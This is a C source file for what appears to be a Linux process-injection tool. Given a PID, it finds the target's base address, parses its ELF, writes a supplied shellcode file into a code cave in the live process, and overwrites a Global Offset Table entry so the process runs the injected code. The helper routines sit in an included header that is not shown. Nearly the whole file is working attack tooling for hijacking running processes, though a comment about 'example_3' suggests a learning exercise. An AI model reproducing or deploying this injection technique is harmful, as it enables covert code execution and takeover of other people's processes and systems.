#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>
#include <sys/stat.h>
#include "got/got.h"

#define COUNT 20
#define GOTMAX 20
#define ELFLEN 18000 // TODO: Make this a more sane value after testing

int main(int argc, char** argv) {
  if (argc != 4) {
    printf("Usage: %s <pid> <code cave offset> <shellcode file>\n", argv[0]); // code cave offset for example_3 is 4745
    return 1;
  }

  /**************************************************************
   * Order of operations:
   *
   * 1. Confirm the target PID exists and read the "maps" file
   * 2. Get the Base Address
   * 3. Calculate the code cave
   * 4. Parse the ELF
   * 5. Grab the GOT
   * 6. Write to the code cave
   * 7. If all has gone well... overwrite the GOT entry and exit
   *
   **************************************************************/

  /*
   * Validate and parse args
   */
  int* pid = malloc(sizeof(int));
  *pid = strtol(argv[1], NULL, 10);
  if (errno == ERANGE || errno == EINVAL || *pid == 0) {
    printf("Something went wrong with the PID you entered...\n");
    return 1;
  }

  unsigned long* cave_offset = malloc(sizeof(unsigned long));
  *cave_offset = strtoul(argv[2], NULL, 10);
  if (errno == ERANGE || errno == EINVAL || *cave_offset == 0) {
    printf("Something went wrong with the code cave offset...\n");
    return 1;
  }

  struct stat st;
  stat(argv[3], &st);

  int* sc_size = malloc(sizeof(int));
  *sc_size = st.st_size;

  char* shell_code = malloc(*sc_size);

  int *fd_sc = malloc(sizeof(int));
  *fd_sc = open(argv[3], O_RDONLY);
  if (*fd_sc == -1) {
    printf("Something went wrong opening the shellcode file...\n");
    return 1;
  }

  read(*fd_sc, shell_code, *sc_size);
  free(fd_sc);

  /*
   * Steps 1 and 2
   */
  char* base_addr = get_base_addr(pid);

  unsigned long* addr = malloc(sizeof(unsigned long));
  *addr = strtoul(base_addr, NULL, 16);
  if (errno == ERANGE || errno == EINVAL || *addr == 0) {
    printf("Something went wrong converting the base addr from a string...\n");
    return 1;
  }

  /*
   * Step 3
   */
  unsigned long* code_cave = malloc(sizeof(unsigned long));
  *code_cave = *addr + *cave_offset;

  /*
   * Step 4
   */
  Elf64_Addr* got = malloc(sizeof(Elf64_Addr)); // Ptr to GOT addr (not actual GOT in ELF)
  int* fd_mem = malloc(sizeof(int)); // Descriptor to ELF
  *got = parse_elf(pid, addr, fd_mem);

  /*
   * Step 5
   */
  // If you have made it this far, we need the table for GOT entries
  got_table* table = (got_table*)malloc(sizeof(got_table));
  if (table == NULL) {
    printf("Could not allocate table var...\n");
    exit(1);
  }

  generate_got_table(table);
  populate_got_table(table, got, fd_mem);

  int* overwrite = malloc(sizeof(int));
  overwrite = read_got_table(table, overwrite);

  /*
   * Step 6
   */
  write_to_cave(code_cave, shell_code, sc_size, fd_mem, table, overwrite);

  /*
   * Step 7
   */
  overwrite_got_entry(table, code_cave, fd_mem, overwrite);

  free(fd_mem);

  return 0;
}
